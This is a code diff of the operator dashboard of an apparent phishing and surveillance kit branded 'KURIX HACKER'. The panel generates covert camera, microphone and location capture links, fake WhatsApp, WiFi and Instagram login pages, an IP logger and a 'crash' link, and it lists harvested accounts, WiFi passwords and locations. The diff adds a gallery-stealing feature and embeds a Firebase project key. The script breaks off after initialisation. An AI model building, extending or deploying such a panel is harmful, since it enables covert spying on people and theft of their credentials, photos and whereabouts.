@@ -4,56 +4,152 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>⛧ KURIX HACKER ⛧</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap');
+
         :root {
-            --bg: #050810;
-            --bg2: #0a0e1c;
-            --bg3: #0f1424;
-            --bg4: #141a2e;
-            --border: #1c2440;
+            --bg: #06080f;
+            --bg2: #0a0d18;
+            --bg3: #0e1120;
+            --bg4: #111528;
+            --border: #1a2040;
             --green: #00e676;
             --green2: #00c853;
             --glow: #00ff41;
+            --green-glow: rgba(0, 255, 65, 0.5);
             --red: #ff1744;
             --red2: #d50000;
+            --red-glow: rgba(255, 23, 68, 0.5);
             --orange: #ff9100;
             --cyan: #00e5ff;
             --cyan2: #00b8d4;
-            --text: #e8eaf0;
-            --muted: #7a8090;
+            --text: #d0d5e0;
+            --muted: #5a6070;
             --radius-sm: 12px;
             --radius: 16px;
             --radius-lg: 22px;
-            --shadow: 0 4px 24px rgba(0,0,0,0.4);
-            --transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
+            --shadow: 0 4px 24px rgba(0,0,0,0.5);
+            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+
         body {
             background: var(--bg);
-            background-image: 
-                radial-gradient(ellipse at 20% 0%, rgba(0,230,118,0.03) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 100%, rgba(0,229,255,0.03) 0%, transparent 50%);
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Fira Code', 'Courier New', monospace;
             padding: 12px;
             min-height: 100vh;
             color: var(--text);
             display: flex;
             justify-content: center;
+            position: relative;
+            overflow-x: hidden;
         }
-        
+
+        /* ============ ARKAPLAN EFEKTLERİ ============ */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.35;
+        }
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0, 255, 65, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: gridMove 20s linear infinite;
+        }
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(40px, 40px); }
+        }
+        .glow-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(130px);
+            pointer-events: none;
+            z-index: 0;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+        .glow-orb.green {
+            width: 450px;
+            height: 450px;
+            background: rgba(0, 255, 65, 0.035);
+            top: -180px;
+            right: -180px;
+            animation-delay: 0s;
+        }
+        .glow-orb.red {
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 0, 64, 0.025);
+            bottom: -150px;
+            left: -150px;
+            animation-delay: 4s;
+        }
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(40px, -40px) scale(1.1); }
+            50% { transform: translate(-30px, 30px) scale(0.9); }
+            75% { transform: translate(-40px, -20px) scale(1.05); }
+        }
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.1) 2px,
+                rgba(0, 0, 0, 0.1) 4px
+            );
+            z-index: 1;
+            pointer-events: none;
+        }
+        .particle {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatUp linear infinite;
+            opacity: 0;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) scale(0); opacity: 0; }
+            5% { opacity: 0.7; }
+            90% { opacity: 0.5; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
+
         .container {
             width: 100%;
-            max-width: 640px;
+            max-width: 680px;
             display: flex;
             flex-direction: column;
             gap: 12px;
+            position: relative;
+            z-index: 10;
         }
-        
+
         /* ============ HEADER ============ */
         .header {
-            background: var(--bg2);
+            background: rgba(10, 13, 24, 0.9);
             border: 1px solid var(--border);
             border-radius: var(--radius-lg);
             padding: 14px 18px;
@@ -66,18 +162,27 @@
             position: sticky;
             top: 12px;
             z-index: 100;
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
         }
         .logo-area { display: flex; align-items: center; gap: 8px; }
         .logo-symbol {
             font-size: 1.6rem;
             animation: logoPulse 2s infinite;
+            color: var(--red);
         }
         @keyframes logoPulse {
             0%,100% { text-shadow: 0 0 8px rgba(255,23,68,0.6); }
-            50% { text-shadow: 0 0 20px rgba(255,23,68,0.9); }
+            50% { text-shadow: 0 0 22px rgba(255,23,68,0.9); }
         }
-        .logo-text { color: var(--glow); font-size: 1.15rem; font-weight: 800; letter-spacing: 1.5px; text-shadow: 0 0 14px rgba(0,255,65,0.3); }
+        .logo-text {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--glow);
+            font-size: 1.1rem;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 14px rgba(0,255,65,0.3);
+        }
         .logo-text .red { color: var(--red); }
         .header-right { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
         .status-badge {
@@ -98,12 +203,14 @@
             padding: 6px 10px;
             border-radius: 14px;
             cursor: pointer;
-            font-size: 1.2rem;
+            font-size: 0.85rem;
             transition: var(--transition);
             line-height: 1;
+            color: var(--muted);
+            font-weight: 600;
         }
-        .flag-btn:hover { border-color: var(--green); transform: scale(1.05); }
-        .flag-btn.active { border-color: var(--green); background: rgba(0,230,118,0.1); box-shadow: 0 0 14px rgba(0,230,118,0.15); }
+        .flag-btn:hover { border-color: var(--green); color: var(--green); transform: scale(1.05); }
+        .flag-btn.active { border-color: var(--green); background: rgba(0,230,118,0.1); box-shadow: 0 0 14px rgba(0,230,118,0.15); color: var(--green); }
         .btn-logout {
             background: var(--red);
             border: none;
@@ -118,32 +225,35 @@
             font-family: inherit;
             white-space: nowrap;
         }
-        .btn-logout:hover { background: var(--red2); transform: translateY(-1px); }
-        
+        .btn-logout:hover { background: var(--red2); transform: translateY(-1px); box-shadow: 0 0 20px var(--red-glow); }
+
         /* ============ STATS ============ */
         .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .stat-card {
-            background: var(--bg2);
+            background: rgba(10, 13, 24, 0.9);
             border: 1px solid var(--border);
             border-radius: var(--radius);
             padding: 16px;
             text-align: center;
             box-shadow: var(--shadow);
             transition: var(--transition);
+            backdrop-filter: blur(10px);
         }
-        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); }
+        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); box-shadow: 0 0 25px rgba(0,230,118,0.1); }
         .stat-icon { font-size: 1.5rem; margin-bottom: 4px; }
         .stat-label { color: var(--muted); font-size: 0.55rem; letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600; margin: 4px 0; }
         .stat-value { color: var(--glow); font-size: 1.6rem; font-weight: 800; text-shadow: 0 0 10px rgba(0,255,65,0.3); }
-        
+
         /* ============ PANEL ============ */
         .panel {
-            background: var(--bg2);
+            background: rgba(10, 13, 24, 0.9);
             border: 1px solid var(--border);
             border-radius: var(--radius-lg);
             padding: 18px;
             box-shadow: var(--shadow);
             transition: var(--transition);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
         }
         .panel-header {
             display: flex;
@@ -167,7 +277,8 @@
         }
         .panel-badge.cyan { background: rgba(0,229,255,0.1); color: var(--cyan); }
         .panel-badge.orange { background: rgba(255,145,0,0.1); color: var(--orange); }
-        
+        .panel-badge.purple { background: rgba(170,0,255,0.1); color: #aa00ff; }
+
         /* SLIDER */
         .slider-group {
             display: flex;
@@ -208,7 +319,48 @@
             min-width: 50px;
             text-align: center;
         }
-        
+
+        /* GALLERY COUNT INPUT */
+        .gallery-count-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--bg3);
+            padding: 10px 14px;
+            border-radius: 26px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            border: 1px solid var(--border);
+        }
+        .gallery-count-group label {
+            color: #aa00ff;
+            font-size: 0.62rem;
+            font-weight: 600;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            min-width: 70px;
+        }
+        .gallery-count-input {
+            flex: 1;
+            min-width: 60px;
+            background: var(--input-bg, rgba(10,12,24,0.95));
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 12px;
+            border-radius: 16px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            outline: none;
+            text-align: center;
+            transition: var(--transition);
+        }
+        .gallery-count-input:focus {
+            border-color: #aa00ff;
+            box-shadow: 0 0 15px rgba(170,0,255,0.15);
+        }
+
         /* BUTTONS */
         .btn-row { display: flex; gap: 6px; flex-wrap: wrap; }
         .btn {
@@ -236,6 +388,8 @@
         .btn.hack:hover { background: var(--orange); color: #000; box-shadow: 0 6px 20px rgba(255,145,0,0.3); }
         .btn.cyan { border-color: var(--cyan); color: var(--cyan); }
         .btn.cyan:hover { background: var(--cyan); color: #000; box-shadow: 0 6px 20px rgba(0,229,255,0.3); }
+        .btn.gallery-btn { border-color: #aa00ff; color: #aa00ff; }
+        .btn.gallery-btn:hover { background: #aa00ff; color: #fff; box-shadow: 0 6px 20px rgba(170,0,255,0.3); }
         .btn.danger { border-color: var(--red); color: var(--red); background: rgba(255,23,68,0.05); }
         .btn.danger:hover { background: var(--red); color: #fff; box-shadow: 0 6px 20px rgba(255,23,68,0.3); }
         .btn.crash {
@@ -248,7 +402,7 @@
             0%,100% { box-shadow: 0 0 0 rgba(255,0,0,0); }
             50% { box-shadow: 0 0 18px rgba(255,0,0,0.5); }
         }
-        
+
         /* OUTPUT */
         .output-box {
             background: var(--bg3);
@@ -263,6 +417,7 @@
         .output-box a { color: var(--glow); font-weight: 600; }
         .output-box a.crash-link { color: #ff0000; font-weight: 800; }
         .output-box a.cyan-link { color: var(--cyan); font-weight: 600; }
+        .output-box a.gallery-link { color: #aa00ff; font-weight: 600; }
         .btn-copy {
             background: var(--green);
             border: none;
@@ -279,7 +434,8 @@
         .output-note { font-size: 0.5rem; margin-top: 4px; display: block; }
         .output-note.red { color: #ff0000; }
         .output-note.cyan { color: var(--cyan); }
-        
+        .output-note.purple { color: #aa00ff; }
+
         /* ============ CARDS ============ */
         .media-card {
             background: var(--bg3);
@@ -289,7 +445,7 @@
             overflow: hidden;
             transition: var(--transition);
         }
-        .media-card:hover { border-color: var(--green); }
+        .media-card:hover { border-color: var(--green); box-shadow: 0 0 15px rgba(0,230,118,0.08); }
         .media-card-header {
             padding: 10px 14px;
             border-bottom: 1px solid var(--border);
@@ -347,7 +503,7 @@
             transition: var(--transition);
         }
         .btn-delete:hover { background: var(--red2); transform: scale(1.03); }
-        
+
         /* LOCATION CARDS */
         .loc-card {
             background: var(--bg3);
@@ -376,9 +532,9 @@
             transition: var(--transition);
         }
         .btn-maps:hover { background: var(--cyan2); transform: scale(1.03); }
-        
-        /* ACCOUNT / WIFI CARDS */
-        .acc-card, .wifi-card {
+
+        /* ACCOUNT / WIFI / GALLERY CARDS */
+        .acc-card, .wifi-card, .gallery-card {
             background: var(--bg3);
             border: 1px solid var(--border);
             border-radius: var(--radius-sm);
@@ -388,19 +544,21 @@
         }
         .acc-card:hover { border-color: var(--red); }
         .wifi-card:hover { border-color: var(--orange); }
-        .acc-header, .wifi-header { display: flex; justify-content: space-between; align-items: center; gap: 4px; margin-bottom: 5px; }
+        .gallery-card:hover { border-color: #aa00ff; }
+        .acc-header, .wifi-header, .gallery-header { display: flex; justify-content: space-between; align-items: center; gap: 4px; margin-bottom: 5px; }
         .acc-user { color: var(--green); font-size: 0.7rem; font-weight: 700; }
         .wifi-ssid { color: var(--orange); font-size: 0.66rem; font-weight: 700; }
-        .acc-time, .wifi-time { color: var(--muted); font-size: 0.5rem; }
-        .acc-row, .wifi-row { color: var(--muted); font-size: 0.54rem; margin-top: 2px; }
-        .acc-row span, .wifi-row span { color: var(--text); font-weight: 700; }
-        
+        .gallery-ip { color: #aa00ff; font-size: 0.66rem; font-weight: 700; }
+        .acc-time, .wifi-time, .gallery-time { color: var(--muted); font-size: 0.5rem; }
+        .acc-row, .wifi-row, .gallery-row { color: var(--muted); font-size: 0.54rem; margin-top: 2px; }
+        .acc-row span, .wifi-row span, .gallery-row span { color: var(--text); font-weight: 700; }
+
         /* LOADING / EMPTY */
         .loading-text { text-align: center; color: var(--green); padding: 24px; font-size: 0.7rem; }
         .empty-text { text-align: center; color: var(--red); padding: 24px; font-size: 0.65rem; }
         .error-text { text-align: center; color: #ff0000; padding: 24px; font-size: 0.65rem; }
         .empty-desc { color: var(--muted); font-size: 0.5rem; margin-top: 4px; display: block; }
-        
+
         /* MODAL */
         .modal-overlay {
             display: none;
@@ -456,19 +614,20 @@
             transition: var(--transition);
         }
         .modal-download-btn:hover { background: var(--green2); transform: translateX(-50%) scale(1.05); }
-        
+
         /* RTL */
         body.rtl { direction: rtl; text-align: right; }
         body.rtl .modal-close { right: auto; left: 20px; }
         body.rtl .panel-header { flex-direction: row-reverse; }
         body.rtl .header { flex-direction: row-reverse; }
         body.rtl .slider-group { flex-direction: row-reverse; }
-        
+        body.rtl .gallery-count-group { flex-direction: row-reverse; }
+
         /* SCROLLBAR */
         ::-webkit-scrollbar { height: 3px; width: 3px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 10px; }
-        
+
         @media (max-width: 400px) {
             .btn { padding: 7px 10px; font-size: 0.58rem; }
             .media-strip img, .media-strip video { width: 55px; height: 55px; }
@@ -476,492 +635,618 @@
     </style>
 </head>
 <body>
-<div class="container">
-    <!-- HEADER -->
-    <div class="header">
-        <div class="logo-area">
-            <span class="logo-symbol">⛧</span>
-            <span class="logo-text"><span class="red">KURIX</span> HACKER</span>
+
+    <!-- ARKAPLAN EFEKTLERİ -->
+    <div class="glow-orb green"></div>
+    <div class="glow-orb red"></div>
+    <div class="bg-grid"></div>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="scanlines"></div>
+
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="logo-area">
+                <span class="logo-symbol"><i class="fa-solid fa-skull"></i></span>
+                <span class="logo-text"><span class="red">KURIX</span> HACKER</span>
+            </div>
+            <div class="header-right">
+                <span class="status-badge" id="accessText">ONLINE</span>
+                <button class="flag-btn active" id="langTrBtn" title="Türkçe">TR</button>
+                <button class="flag-btn" id="langArBtn" title="العربية">AR</button>
+                <button class="btn-logout" id="logoutBtn"><i class="fa-solid fa-right-from-bracket"></i> ÇIKIŞ</button>
+            </div>
         </div>
-        <div class="header-right">
-            <span class="status-badge" id="accessText">ONLINE</span>
-            <button class="flag-btn active" id="langTrBtn" title="Türkçe">🇹🇷</button>
-            <button class="flag-btn" id="langArBtn" title="العربية">🇸🇦</button>
-            <button class="btn-logout" id="logoutBtn">⛧ ÇIKIŞ</button>
+
+        <!-- STATS -->
+        <div class="stats-row">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fa-solid fa-camera"></i></div>
+                <div class="stat-label" id="statCaptures">ÇEKİMLER</div>
+                <div class="stat-value" id="captureCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fa-solid fa-film"></i></div>
+                <div class="stat-label" id="statMedia">MEDYA</div>
+                <div class="stat-value" id="mediaCount">0</div>
+            </div>
         </div>
+
+        <!-- NORMAL KAMERA -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-solid fa-camera"></i></span>
+                <span class="panel-title" id="panelCamera">KAMERA</span>
+            </div>
+            <div class="slider-group">
+                <span class="slider-label"><i class="fa-solid fa-clock"></i> <span id="labelDuration">SÜRE</span></span>
+                <input type="range" class="slider-input" id="videoDuration" min="1" max="60" value="6">
+                <span class="slider-value" id="durationValue">6sn</span>
+            </div>
+            <div class="btn-row">
+                <button class="btn" id="btnPhoto1"><i class="fa-solid fa-image"></i> FOTO</button>
+                <button class="btn" id="btnPhoto5"><i class="fa-solid fa-images"></i> 5FOTO</button>
+                <button class="btn" id="btnVideo"><i class="fa-solid fa-video"></i> VİDEO</button>
+                <button class="btn" id="btnAudio"><i class="fa-solid fa-microphone"></i> SES</button>
+                <button class="btn" id="btnVideoAudio"><i class="fa-solid fa-video"></i><i class="fa-solid fa-microphone"></i> V+SES</button>
+            </div>
+            <div class="output-box" id="outputCamera"></div>
+        </div>
+
+        <!-- INSTAGRAM KAMERA -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-brands fa-instagram"></i></span>
+                <span class="panel-title" id="panelInsta">INSTAGRAM KAMERA</span>
+                <span class="panel-badge">CHROME</span>
+            </div>
+            <div class="slider-group">
+                <span class="slider-label"><i class="fa-solid fa-clock"></i> <span id="labelInstaDuration">INSTA SÜRE</span></span>
+                <input type="range" class="slider-input" id="igVideoDuration" min="1" max="60" value="6">
+                <span class="slider-value" id="igDurationValue">6sn</span>
+            </div>
+            <div class="btn-row">
+                <button class="btn insta" id="btnIgPhoto"><i class="fa-solid fa-image"></i> FOTO</button>
+                <button class="btn insta" id="btnIgPhoto5"><i class="fa-solid fa-images"></i> 5FOTO</button>
+                <button class="btn insta" id="btnIgVideo"><i class="fa-solid fa-video"></i> VİDEO</button>
+                <button class="btn insta" id="btnIgAudio"><i class="fa-solid fa-microphone"></i> SES</button>
+                <button class="btn insta" id="btnIgVideoAudio"><i class="fa-solid fa-video"></i><i class="fa-solid fa-microphone"></i> V+SES</button>
+            </div>
+            <div class="output-box" id="outputInsta"></div>
+        </div>
+
+        <!-- HACK ARAÇLARI -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-solid fa-bolt"></i></span>
+                <span class="panel-title" id="panelHack">HACK ARAÇLARI</span>
+            </div>
+            <!-- GALERİ SAYI BELİRLEME -->
+            <div class="gallery-count-group">
+                <label><i class="fa-solid fa-images"></i> <span id="labelGalleryCount">GALERİ SAYISI</span></label>
+                <input type="number" class="gallery-count-input" id="galleryCount" min="1" max="100" value="10" placeholder="10">
+            </div>
+            <div class="btn-row">
+                <button class="btn hack" id="btnIpLogger"><i class="fa-solid fa-satellite-dish"></i> IP LOGGER</button>
+                <button class="btn hack" id="btnWaFake"><i class="fa-brands fa-whatsapp"></i> WHATSAPP</button>
+                <button class="btn hack" id="btnWifiFake"><i class="fa-solid fa-wifi"></i> WIFI FAKE</button>
+                <button class="btn hack" id="btnIgFake"><i class="fa-brands fa-instagram"></i> INSTAGRAM</button>
+                <button class="btn cyan" id="btnLocation"><i class="fa-solid fa-location-dot"></i> KONUM</button>
+                <button class="btn gallery-btn" id="btnGallery"><i class="fa-solid fa-images"></i> GALERİ</button>
+                <button class="btn crash" id="btnCrash"><i class="fa-solid fa-skull-crossbones"></i> CRASH</button>
+            </div>
+            <div class="output-box" id="outputHack"></div>
+        </div>
+
+        <!-- KONUMLAR -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-solid fa-location-dot"></i></span>
+                <span class="panel-title" id="panelLocations">KONUMLAR</span>
+                <span class="panel-badge cyan" id="badgeLocations">GPS</span>
+            </div>
+            <div class="btn-row" style="margin-bottom:10px;">
+                <button class="btn" id="btnRefreshLoc"><i class="fa-solid fa-rotate"></i> <span id="labelRefreshLoc">YENİLE</span></button>
+                <button class="btn danger" id="btnClearLoc"><i class="fa-solid fa-trash"></i> <span id="labelClearLoc">TEMİZLE</span></button>
+            </div>
+            <div id="locationsList"></div>
+        </div>
+
+        <!-- WIFI HESAPLAR -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-solid fa-wifi"></i></span>
+                <span class="panel-title" id="panelWifi">WIFI HESAPLAR</span>
+                <span class="panel-badge orange">WiFi</span>
+            </div>
+            <div class="btn-row" style="margin-bottom:10px;">
+                <button class="btn" id="btnRefreshWifi"><i class="fa-solid fa-rotate"></i> <span id="labelRefreshWifi">YENİLE</span></button>
+                <button class="btn danger" id="btnClearWifi"><i class="fa-solid fa-trash"></i> <span id="labelClearWifi">TEMİZLE</span></button>
+            </div>
+            <div id="wifiList"></div>
+        </div>
+
+        <!-- INSTAGRAM HESAPLAR -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-brands fa-instagram"></i></span>
+                <span class="panel-title" id="panelAccounts">INSTAGRAM HESAPLAR</span>
+                <span class="panel-badge">IG</span>
+            </div>
+            <div class="btn-row" style="margin-bottom:10px;">
+                <button class="btn" id="btnRefreshAcc"><i class="fa-solid fa-rotate"></i> <span id="labelRefreshAcc">YENİLE</span></button>
+                <button class="btn danger" id="btnClearAcc"><i class="fa-solid fa-trash"></i> <span id="labelClearAcc">TEMİZLE</span></button>
+            </div>
+            <div id="accountsList"></div>
+        </div>
+
+        <!-- GALERİ HACK -->
+        <div class="panel">
+            <div class="panel-header">
+                <span class="panel-icon"><i class="fa-solid fa-images"></i></span>
+                <span class="panel-title" id="panelGallery">GALERİ HACK</span>
+                <span class="panel-badge purple">GALLERY</span>
+            </div>
+            <div class="btn-row" style="margin-bottom:10px;">
+                <button class="btn" id="btnRefreshGallery"><i class="fa-solid fa-rotate"></i> <span id="labelRefreshGallery">YENİLE</span></button>
+                <button class="btn danger" id="btnClearGallery"><i class="fa-solid fa-trash"></i> <span id="labelClearGallery">TEMİZLE</span></button>
+            </div>
+            <div id="galleryList"></div>
+        </div>
+
+        <!-- ALT BUTONLAR -->
+        <div class="btn-row" style="justify-content:center;margin-bottom:4px;">
+            <button class="btn" id="btnRefreshAll"><i class="fa-solid fa-rotate"></i> <span id="labelRefreshAll">TÜMÜNÜ YENİLE</span></button>
+            <button class="btn danger" id="btnClearAll"><i class="fa-solid fa-skull"></i> <span id="labelClearAll">TÜM ÇEKİMLERİ SİL</span></button>
+        </div>
+
+        <div id="capturesList"></div>
     </div>
-    
-    <!-- STATS -->
-    <div class="stats-row">
-        <div class="stat-card">
-            <div class="stat-icon">📸</div>
-            <div class="stat-label" id="statCaptures">ÇEKİMLER</div>
-            <div class="stat-value" id="captureCount">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-icon">🎬</div>
-            <div class="stat-label" id="statMedia">MEDYA</div>
-            <div class="stat-value" id="mediaCount">0</div>
-        </div>
+
+    <!-- MODAL -->
+    <div class="modal-overlay" id="modal">
+        <span class="modal-close" id="modalClose"><i class="fa-solid fa-xmark"></i></span>
+        <div id="modalContent"></div>
+        <button class="modal-download-btn" id="modalDownloadBtn" style="display:none;"><i class="fa-solid fa-download"></i> İNDİR</button>
     </div>
-    
-    <!-- NORMAL KAMERA -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">📷</span>
-            <span class="panel-title" id="panelCamera">KAMERA</span>
-        </div>
-        <div class="slider-group">
-            <span class="slider-label">🎬 <span id="labelDuration">SÜRE</span></span>
-            <input type="range" class="slider-input" id="videoDuration" min="1" max="60" value="6">
-            <span class="slider-value" id="durationValue">6sn</span>
-        </div>
-        <div class="btn-row">
-            <button class="btn" id="btnPhoto1">📸 FOTO</button>
-            <button class="btn" id="btnPhoto5">📸 5FOTO</button>
-            <button class="btn" id="btnVideo">🎬 VİDEO</button>
-            <button class="btn" id="btnAudio">🎤 SES</button>
-            <button class="btn" id="btnVideoAudio">🎬🎤 V+SES</button>
-        </div>
-        <div class="output-box" id="outputCamera"></div>
-    </div>
-    
-    <!-- INSTAGRAM KAMERA -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">📱</span>
-            <span class="panel-title" id="panelInsta">INSTAGRAM KAMERA</span>
-            <span class="panel-badge">CHROME</span>
-        </div>
-        <div class="slider-group">
-            <span class="slider-label">🎬 <span id="labelInstaDuration">INSTA SÜRE</span></span>
-            <input type="range" class="slider-input" id="igVideoDuration" min="1" max="60" value="6">
-            <span class="slider-value" id="igDurationValue">6sn</span>
-        </div>
-        <div class="btn-row">
-            <button class="btn insta" id="btnIgPhoto">📸 FOTO</button>
-            <button class="btn insta" id="btnIgPhoto5">📸 5FOTO</button>
-            <button class="btn insta" id="btnIgVideo">🎬 VİDEO</button>
-            <button class="btn insta" id="btnIgAudio">🎤 SES</button>
-            <button class="btn insta" id="btnIgVideoAudio">🎬🎤 V+SES</button>
-        </div>
-        <div class="output-box" id="outputInsta"></div>
-    </div>
-    
-    <!-- HACK ARAÇLARI -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">⚡</span>
-            <span class="panel-title" id="panelHack">HACK ARAÇLARI</span>
-        </div>
-        <div class="btn-row">
-            <button class="btn hack" id="btnIpLogger">📡 IP LOGGER</button>
-            <button class="btn hack" id="btnWaFake">🔐 WHATSAPP</button>
-            <button class="btn hack" id="btnWifiFake">📶 WIFI FAKE</button>
-            <button class="btn hack" id="btnIgFake">📸 INSTAGRAM</button>
-            <button class="btn cyan" id="btnLocation">📍 KONUM</button>
-            <button class="btn crash" id="btnCrash">💀 CRASH</button>
-        </div>
-        <div class="output-box" id="outputHack"></div>
-    </div>
-    
-    <!-- KONUMLAR -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">📍</span>
-            <span class="panel-title" id="panelLocations">KONUMLAR</span>
-            <span class="panel-badge cyan" id="badgeLocations">GPS</span>
-        </div>
-        <div class="btn-row" style="margin-bottom:10px;">
-            <button class="btn" id="btnRefreshLoc">⟳ <span id="labelRefreshLoc">YENİLE</span></button>
-            <button class="btn danger" id="btnClearLoc">🗑 <span id="labelClearLoc">TEMİZLE</span></button>
-        </div>
-        <div id="locationsList"></div>
-    </div>
-    
-    <!-- WIFI HESAPLAR -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">📶</span>
-            <span class="panel-title" id="panelWifi">WIFI HESAPLAR</span>
-            <span class="panel-badge orange">WiFi</span>
-        </div>
-        <div class="btn-row" style="margin-bottom:10px;">
-            <button class="btn" id="btnRefreshWifi">⟳ <span id="labelRefreshWifi">YENİLE</span></button>
-            <button class="btn danger" id="btnClearWifi">🗑 <span id="labelClearWifi">TEMİZLE</span></button>
-        </div>
-        <div id="wifiList"></div>
-    </div>
-    
-    <!-- INSTAGRAM HESAPLAR -->
-    <div class="panel">
-        <div class="panel-header">
-            <span class="panel-icon">📋</span>
-            <span class="panel-title" id="panelAccounts">INSTAGRAM HESAPLAR</span>
-            <span class="panel-badge">IG</span>
-        </div>
-        <div class="btn-row" style="margin-bottom:10px;">
-            <button class="btn" id="btnRefreshAcc">⟳ <span id="labelRefreshAcc">YENİLE</span></button>
-            <button class="btn danger" id="btnClearAcc">🗑 <span id="labelClearAcc">TEMİZLE</span></button>
-        </div>
-        <div id="accountsList"></div>
-    </div>
-    
-    <!-- ALT BUTONLAR -->
-    <div class="btn-row" style="justify-content:center;margin-bottom:4px;">
-        <button class="btn" id="btnRefreshAll">⟳ <span id="labelRefreshAll">TÜMÜNÜ YENİLE</span></button>
-        <button class="btn danger" id="btnClearAll">⛧ <span id="labelClearAll">TÜM ÇEKİMLERİ SİL</span></button>
-    </div>
-    
-    <div id="capturesList"></div>
-</div>
 
-<!-- MODAL -->
-<div class="modal-overlay" id="modal">
-    <span class="modal-close" id="modalClose">✕</span>
-    <div id="modalContent"></div>
-    <button class="modal-download-btn" id="modalDownloadBtn" style="display:none;">⬇ İNDİR</button>
-</div>
+    <script type="importmap">
+        { "imports": { "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js", "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js", "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js" } }
+    </script>
 
-<script type="importmap">
-    { "imports": { "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js", "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js", "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js" } }
-</script>
+    <script type="module">
+        import { initializeApp } from "firebase/app";
+        import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
+        import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";
 
-<script type="module">
-    import { initializeApp } from "firebase/app";
-    import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
-    import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";
+        const fc = { apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao", authDomain: "camerahhh-15487.firebaseapp.com", projectId: "camerahhh-15487", storageBucket: "camerahhh-15487.firebasestorage.app", messagingSenderId: "212849652224", appId: "1:212849652224:web:19d8a85c01cd81005bdee5", measurementId: "G-WDVJV36W7X" };
+        const app = initializeApp(fc);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const BASE = location.origin + location.pathname.replace(/\/[^/]*$/, '');
 
